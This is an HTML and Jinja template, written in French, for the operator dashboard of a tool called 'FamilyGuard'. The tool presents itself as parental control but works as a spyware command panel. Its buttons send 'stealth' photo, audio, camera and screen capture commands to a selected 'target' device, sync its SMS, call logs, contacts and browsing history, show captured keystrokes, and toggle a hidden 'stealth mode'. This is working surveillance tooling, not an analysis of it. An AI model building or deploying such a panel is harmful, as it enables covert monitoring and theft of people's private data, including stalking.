<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FamilyGuard | Centre de Contrôle</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f1f5f9; margin: 0; display: flex; flex-direction: column; height: 100vh; }
        header { background: #1e293b; padding: 20px; border-bottom: 2px solid #334155; text-align: center; }
        .container { display: flex; flex: 1; overflow: hidden; }
        .sidebar { width: 300px; background: #1e293b; border-right: 2px solid #334155; padding: 20px; overflow-y: auto; }
        .main { flex: 1; padding: 40px; overflow-y: auto; }
        .device-card { background: #334155; padding: 15px; border-radius: 8px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
        .device-card:hover { background: #475569; }
        .device-card.active { border-left: 5px solid #38bdf8; }
        h2 { color: #38bdf8; }
        .controls { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; }
        button { background: #0284c7; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background: #0369a1; transform: translateY(-2px); }
        button.danger { background: #ef4444; }
        button.danger:hover { background: #dc2626; }
        .status-badge { display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 0.8rem; background: #22c55e; }
        .console { background: #000; color: #22c55e; padding: 20px; border-radius: 8px; font-family: monospace; height: 200px; overflow-y: auto; margin-top: 40px; }
    </style>
</head>
<body>
    <header>
        <h1>👨‍👩-👧 FamilyGuard Control Center</h1>
    </header>
    <div class="container">
        <div class="sidebar">
            <h2>Appareils Connectés</h2>
            <div id="device-list">
                {% if devices %}
                    {% for device in devices %}
                        <div class="device-card active" onclick="selectDevice('{{ device }}')">
                            <strong>{{ device }}</strong><br>
                            <span class="status-badge">En ligne</span>
                        </div>
                    {% endfor %}
                {% else %}
                    <p>Aucun appareil en ligne...</p>
                {% endif %}
            </div>
        </div>
        <div class="main">
            <h2 id="active-device-name">Sélectionnez un appareil</h2>
            <div class="controls" id="control-panel" style="display: none;">
                <button onclick="sendCommand('take_photo')">📸 Prendre Photo Stealth</button>
                <button onclick="sendCommand('record_audio')">🎤 Enregistrer Audio (30s)</button>
                <button onclick="sendCommand('sync_logs')">📜 Synchroniser SMS/Appels</button>
                <button onclick="sendCommand('sync_contacts')">📇 Synchroniser Contacts</button>
                <button onclick="sendCommand('sync_history')">🌐 Historique Navigation</button>
                <button onclick="viewKeystrokes()">⌨️ Voir Frappes Clavier</button>
                <button onclick="sendCommand('start_surveillance')">📹 Caméra Surveillance (60s)</button>
                <button onclick="sendCommand('start_screen_record')">🖥️ Capture d'Écran (30s)</button>
                <button onclick="sendCommand('enable_stealth')">👻 Activer Mode Furtif</button>
                <button onclick="sendCommand('disable_stealth')">👁️ Désactiver Mode Furtif</button>
                <button class="danger" onclick="sendCommand('emergency_alert')">🚨 Alerte Urgence</button>
            </div>

            <div class="console" id="console">
                > Initialisation du système...<br>
                > Prêt pour les commandes.<br>
            </div>
        </div>
    </div>

    <script>
        let currentDevice = null;

        function selectDevice(deviceId) {
            currentDevice = deviceId;
            document.getElementById('active-device-name').innerText = "Contrôle de : " + deviceId;
            document.getElementById('control-panel').style.display = 'grid';
            logConsole("Cible sélectionnée : " + deviceId);
        }

        async function sendCommand(action) {
            if (!currentDevice) return;
            
            logConsole("Envoi de la commande : " + action + "...");
            
            const formData = new FormData();
            formData.append('device_id', currentDevice);
            formData.append('action', action);
            formData.append('duration', 30);

            try {
                const response = await fetch('/admin/command', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                logConsole("Réponse serveur : " + JSON.stringify(result));
            } catch (error) {
                logConsole("ERREUR : " + error.message);
            }
        }

        async function viewKeystrokes() {
            if (!currentDevice) return;
            logConsole("Récupération des frappes clavier...");
            
            try {
                const response = await fetch(`/admin/keystrokes/${currentDevice}`);
                const result = await response.json();
                
                if (result.status === "success" && result.data.length > 0) {
                    logConsole("--- DERNIÈRES FRAPPES ---");
                    result.data.forEach(file => {
                        logConsole(file.content);
                    });
                    logConsole("-------------------------");
                } else {
                    logConsole("Aucun log clavier trouvé pour cet appareil.");
                }
            } catch (error) {
                logConsole("ERREUR : " + error.message);
            }
        }

        function logConsole(msg) {
            const consoleDiv = document.getElementById('console');
            consoleDiv.innerHTML += "> " + msg + "<br>";
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }
    </script>
</body>
</html>
